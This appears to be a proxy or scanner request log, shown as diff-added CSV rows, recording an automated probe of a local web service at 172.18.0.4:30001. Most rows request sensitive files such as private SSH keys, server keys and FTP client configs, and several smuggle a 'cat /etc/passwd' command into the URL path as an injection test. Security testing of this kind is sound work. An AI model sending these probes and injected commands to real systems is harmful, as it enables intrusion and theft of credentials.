+557,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,475,229,84
+558,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/.svn/entries,404,Not Found,90,429,25
+559,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/.svn/wc.db,404,Not Found,50,430,23
+560,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/CVS/root,404,Not Found,26,431,21
+561,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/mozstd-trackwhite-digest256/1670952926,200,OK,250,487,337079
+562,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,200,OK,529,229,84
+563,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/server-status,404,Not Found,172,428,26
+564,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,507,229,84
+565,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/core,404,Not Found,50,430,17
+566,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/sftp-config.json,404,Not Found,22,430,29
+567,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/WS_FTP.ini,404,Not Found,35,427,23
+568,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/ws_ftp.ini,404,Not Found,44,431,23
+569,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/WS_FTP.INI,404,Not Found,18,429,23
+570,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/filezilla.xml,404,Not Found,92,431,26
+571,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/sitemanager.xml,404,Not Found,5,430,28
+572,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/FileZilla.xml,404,Not Found,19,431,26
+573,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/winscp.ini,404,Not Found,48,426,23
+574,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/WinSCP.ini,404,Not Found,4,426,23
+575,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/.DS_Store,404,Not Found,12,426,22
+576,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/.php_cs.cache,404,Not Found,7,430,26
+577,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/DEADJOE,404,Not Found,48,428,20
+578,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/sites/default/private/files/backup_migrate/scheduled/test.txt,404,Not Found,15,428,74
+579,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/app/etc/local.xml,404,Not Found,35,435,30
+580,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/server.key,404,Not Found,52,430,23
+581,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/google-trackwhite-digest256/1604686195,200,OK,493,488,1470328
+582,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/privatekey.key,404,Not Found,83,427,27
+583,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/myserver.key,404,Not Found,5,426,25
+584,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/key.pem,404,Not Found,67,428,20
+585,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/id_rsa,404,Not Found,5,428,19
+586,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/id_dsa,404,Not Found,9,428,19
+587,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/.ssh/id_rsa,404,Not Found,45,426,24
+588,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/.ssh/id_dsa,404,Not Found,5,432,24
+589,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/adminer.php,404,Not Found,12,430,24
+590,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/vb_test.php,404,Not Found,58,428,24
+591,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/CHANGELOG.txt,404,Not Found,6,428,26
+592,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/sites/default/files/.ht.sqlite,404,Not Found,53,427,43
+593,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/composer.json,404,Not Found,47,428,26
+594,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/composer.lock,404,Not Found,14,434,26
+595,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:48 CET 2023,GET,http://172.18.0.4:30001/vim_settings.xml,404,Not Found,15,430,29
+596,Mon Mar 20 21:52:48 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/server-info,404,Not Found,59,432,24
+597,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/phpinfo.php,404,Not Found,81,429,24
+598,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/info.php,404,Not Found,13,430,21
+599,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/i.php,404,Not Found,56,426,18
+600,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/test.php,404,Not Found,24,432,21
+601,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/.hg,404,Not Found,10,428,16
+602,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/.bzr,404,Not Found,54,430,17
+603,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/._darcs,404,Not Found,59,429,20
+604,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:49 CET 2023,GET,http://172.18.0.4:30001/BitKeeper,404,Not Found,14,426,22
+605,Mon Mar 20 21:52:50 CET 2023,Mon Mar 20 21:52:50 CET 2023,GET,http://172.18.0.4:30001/favicon.ico,404,Not Found,431,432,24
+606,Mon Mar 20 21:52:51 CET 2023,Mon Mar 20 21:52:51 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-fingerprinting-track-digest256/1663274228,200,OK,141,473,3605
+607,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:53 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/cat+%2Fetc%2Fpasswd,200,OK,5410,230,84
+608,Mon Mar 20 21:52:49 CET 2023,Mon Mar 20 21:52:53 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,3979,230,84
+609,Mon Mar 20 21:52:59 CET 2023,Mon Mar 20 21:53:00 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-cryptomining-track-digest256/1604686195,200,OK,561,473,2261
+610,Mon Mar 20 21:53:01 CET 2023,Mon Mar 20 21:53:01 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-facebook-digest256/1604686195,200,OK,117,483,436
+611,Mon Mar 20 21:53:04 CET 2023,Mon Mar 20 21:53:04 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-linkedin-digest256/1564526481,200,OK,337,472,115
+612,Mon Mar 20 21:52:53 CET 2023,Mon Mar 20 21:53:07 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%26cat+%2Fetc%2Fpasswd%26,200,OK,13785,231,84
+613,Mon Mar 20 21:52:53 CET 2023,Mon Mar 20 21:53:07 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,13854,231,84
+614,Mon Mar 20 21:53:09 CET 2023,Mon Mar 20 21:53:09 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-twitter-digest256/1604686195,200,OK,522,472,212
+615,Mon Mar 20 21:53:36 CET 2023,Mon Mar 20 21:53:37 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-email-track-digest256/1668785275,200,OK,782,505,6933
+617,Mon Mar 20 21:53:31 CET 2023,Mon Mar 20 21:53:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,14671,231,84
+616,Mon Mar 20 21:53:31 CET 2023,Mon Mar 20 21:53:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%22%26cat+%2Fetc%2Fpasswd%26%22,200,OK,14610,231,84
